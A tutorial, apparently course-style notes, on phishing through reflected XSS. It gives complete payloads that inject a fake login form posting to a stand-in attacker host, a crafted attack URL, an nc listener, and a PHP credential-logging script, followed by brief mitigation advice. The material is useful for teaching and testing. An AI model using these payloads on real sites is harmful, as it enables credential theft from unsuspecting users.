**Phishing via Cross-Site Scripting (XSS)** is an attack technique where an attacker injects malicious code into a vulnerable web application to display a **fake login form or interface** that tricks users into submitting their credentials.

This type of attack leverages the **trust users place in legitimate websites**. Since the malicious form appears within a real domain, victims may believe the login request is legitimate and unknowingly provide sensitive information such as usernames and passwords.

XSS phishing attacks are commonly performed through **Reflected XSS**, where attackers send victims specially crafted URLs containing the malicious payload.

---

## Purpose of XSS Phishing Attacks

The primary objective of phishing through XSS is to **collect sensitive user information**, including:

- Usernames and passwords
    
- Session identifiers
    
- Personal information
    

Because the malicious content is executed within a trusted domain, users are less likely to suspect that the page is compromised.

Organizations may also use simulated phishing attacks internally to **evaluate employee security awareness** and identify potential weaknesses in user behavior.

---

## Discovering the XSS Vulnerability

Before performing the phishing attack, the attacker must first identify a working XSS payload.

Consider a web application that displays an image based on a URL parameter:

```url
http://SERVER_IP/phishing/index.php?url=https://example.com/image.png
```

The application takes the value of the `url` parameter and displays the image on the page.

A typical first test is to inject a simple payload:

```html
<script>alert(window.origin)</script>
```

Example request:

```url
http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>
```

If the script does not execute, it indicates that the application may filter `<script>` tags or treat the input as part of another HTML element.

At this stage, testers must analyze how the input is rendered in the HTML source to determine the correct payload context.

---

## Injecting a Fake Login Form

Once a working XSS payload is identified, the attacker can inject **HTML code that displays a login form**.

Example HTML form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
<input type="username" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="submit" name="submit" value="Login">
</form>
```

The `action` attribute specifies the server where the form data will be sent. In this attack scenario, the form submits credentials to the attacker's system.

To insert this HTML into the page using XSS, the attacker can use the `document.write()` JavaScript function.

Example payload:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACK_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

When this payload executes, the page displays a login form controlled by the attacker.

---

## Removing Legitimate Page Elements

To make the phishing page more convincing, attackers often remove original elements that may reveal the malicious injection.

For example, if the original page contains a form with the identifier `urlform`, it can be removed using the DOM API.

Example code:

```javascript
document.getElementById('urlform').remove();
```

Combining this with the login form injection results in the following script:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

This hides the original interface and replaces it with the malicious login prompt.

---

## Cleaning Remaining Page Content

After injecting new content, fragments of the original HTML may still appear on the page.

Attackers often hide the remaining code by inserting an HTML comment after the payload.

Example:

```html
...PAYLOAD... <!--
```

This prevents additional page content from appearing after the injected elements, making the page appear cleaner and more legitimate.

---
## Injecting the Payload in the URL

Since this attack exploits a **Reflected XSS vulnerability**, the malicious JavaScript must be placed inside a request parameter. The attacker then sends the crafted URL to the victim.

Example URL containing the injected payload:

```html
http://SERVER_IP/phishing/index.php?url="><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--
```

In this request:

- The payload **breaks out of the original HTML attribute context**
    
- JavaScript code is executed in the victim's browser
    
- The injected script **writes a fake login form to the page**
    
- The legitimate form is removed to avoid suspicion
    
- The remaining HTML is hidden using an HTML comment
    

When the victim visits this malicious URL, the page will appear to require authentication. If the victim submits their credentials, the login form sends the data to the attacker's server.

This technique is commonly used in phishing attacks because the URL can be delivered through:

- Email messages
    
- Messaging platforms
    
- Social engineering campaigns
    
- Malicious redirects
    

Once the victim clicks the link, the injected script executes automatically in the context of the trusted website.


---
## Credential Capture

Once the phishing interface is displayed, the attacker needs to capture the submitted credentials.

A simple method is to listen for incoming HTTP requests using a network listener.

Example command:

```bash
sudo nc -lvnp 80
```

When a victim submits the form, the browser sends a request similar to the following:

```http
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: ATTACKER_IP
```

This allows the attacker to view the credentials directly in the request.

---

## Logging Credentials with a Server Script

Using a basic listener may generate browser errors that could alert the victim. A more realistic attack involves running a small web server that records the credentials and redirects the user back to the original page.

Example PHP script:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
$file = fopen("creds.txt", "a+");
fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
header("Location: http://SERVER_IP/phishing/index.php");
fclose($file);
exit();
}
?>
```

This script performs three actions:

1. Receives the submitted credentials
    
2. Stores them in a file
    
3. Redirects the victim back to the legitimate page
    

From the victim's perspective, the login process appears normal.

---

## Mitigation

Preventing XSS phishing attacks requires eliminating XSS vulnerabilities and implementing defensive controls.

Recommended security practices include:

- Proper input validation and sanitization
    
- Output encoding before rendering user input
    
- Avoiding dynamic DOM manipulation with unsanitized data
    
- Implementing Content Security Policy (CSP)
    
- Using security frameworks that automatically escape user input
    

Example CSP header:

```http
Content-Security-Policy: default-src 'self'
```

Content Security Policy helps limit the execution of injected scripts and reduces the impact of successful XSS attacks.

